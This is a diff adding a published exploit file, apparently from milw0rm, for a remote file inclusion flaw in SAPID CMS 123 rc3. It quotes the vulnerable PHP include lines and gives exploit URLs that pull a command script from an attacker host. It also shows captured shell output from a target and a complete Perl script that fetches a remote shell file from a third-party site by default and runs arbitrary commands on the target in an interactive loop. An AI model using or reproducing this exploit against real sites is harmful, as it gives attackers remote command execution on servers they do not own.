@@ -1,0 +1,125 @@
+#########################################################################
+# Title: SAPID CMS Multiple remote Command Execution Vulnerabilities
+#
+# Author: Simo64 <simo64_at_morx_org>
+# 
+# Discovered: 06 Aout 2006
+# 
+# Published : 08 Aout 2006
+# 
+# MorX Security Research Team
+# 
+# http://www.morx.org
+# 
+# Vendor : SAPID CMS
+#
+# Version : 123 rc3 ()
+# 
+# Website : http://sapid.sourceforge.net
+# 
+# Severity: Critical
+# 
+# Details: 
+# 
+# 
+# [+] Remote File Inclusion
+# 
+# 1) vulnerable code in usr/extensions/get_infochannel.inc.php lines( 8 - 9 )
+# 
+# if(!defined("common_extfunctions")) { define("common_extfunctions", "loaded");
+# include($root_path."usr/system/common_extfunctions.inc.php"); }
+#
+# 2) vulnerable code in usr/extensions/get_tree.inc.php lines( 9 - 10 )
+#
+# if(!defined("common_extfunctions")) { define("common_extfunctions", "loaded");
+# include($GLOBALS["root_path"]."usr/system/common_extfunctions.inc.php"); }
+#
+# $root_path , $GLOBALS["root_path"] variable are not sanitized ,before it can be used to include files
+# 
+# [-] Exploit : 
+# 
+# http://localhost/usr/extensions/get_infochannel.inc.php?root_path=http://attacker/cmd.txt?cmd=id;pwd
+# 
+# http://localhost/usr/extensions/get_tree.inc.php?GLOBALS["root_path"]=http://attacker/cmd.txt?cmd=id;pwd
+#
+#======================================
+# Poc Remote Command Execution Exploit:
+#======================================
+#
+# http://www.morx.org/sapid.txt
+#
+# C:\>perl sapid.pl http://127.0.0.1
+#
+# ===============================================================
+# =  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =
+# ===============================================================
+# =       MorX Security Research Team - www.morx.org            =
+# =       Coded by Simo64 - simo64@www.morx.org                 =
+# ===============================================================
+
+# simo64@morx.org :~$ id; ls
+# uid=48(apache) gid=48(apache) groups=48(apache)
+# get_calendar.inc.php
+# get_filter_list.inc.php
+# get_gb_records.inc.php
+# get_infochannelfilter.inc.php
+# get_infochannel.inc.php
+# get_rss.inc.php
+# get_searchresults.inc.php
+# get_survey.inc.php
+# get_track.inc.php
+# get_tree.inc.php
+# soap_call.inc.php
+# simo64@morx.org :~$ exit
+
+# Enjoy !
+#
+#!/usr/bin/perl
+
+
+use LWP::Simple;
+
+print "\n===============================================================\n";
+print "=  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =\n";
+print "===============================================================\n";
+print "=       MorX Security Research Team - www.morx.org            =\n";
+print "=       Coded by Simo64 - simo64\@www.morx.org                 =\n"; 
+print "===============================================================\n\n";
+
+my $targ,$rsh,$path,$con,$cmd,$data,$getit ;
+
+$targ = $ARGV[0];
+$rsh  = $ARGV[1];
+
+if(!$ARGV[1]) {$rsh = "http://zerostag.free.fr/sh.txt";}
+
+if(!@ARGV) { &usage;exit(0);}
+
+	$targ = $ARGV[0];
+	
+
+	
+	chomp($targ);
+    chomp($rsh);
+    
+	$path = $targ."/usr/extensions/get_infochannel.inc.php";
+	$con  = get($path) || die "[-]Cannot connect to Host"; 
+
+sub usage(){
+	print "Usage    : perl $0 host/path [OPTION]\n\n";
+	print "Exemples : perl $0 http://127.0.0.1\n";
+	print "           perl $0 http://127.0.0.1 http://yoursite/yourcmd.txt\n\n";
+	}
+
+while ()  
+{  
+	 print "simo64\@morx.org :~\$ ";
+	 chomp($cmd=<STDIN>);
+     if ($cmd eq "exit") { print "\nEnjoy !\n\n";exit(0);}
+     $getit = $path."?root_path=".$rsh."?&cmd=".$cmd;
+     $data=get($getit);
+     if($cmd eq ""){ print "Please enter command !\n"; }
+     else{ print $data ;}
+}
+
+# milw0rm.com [2006-08-10]
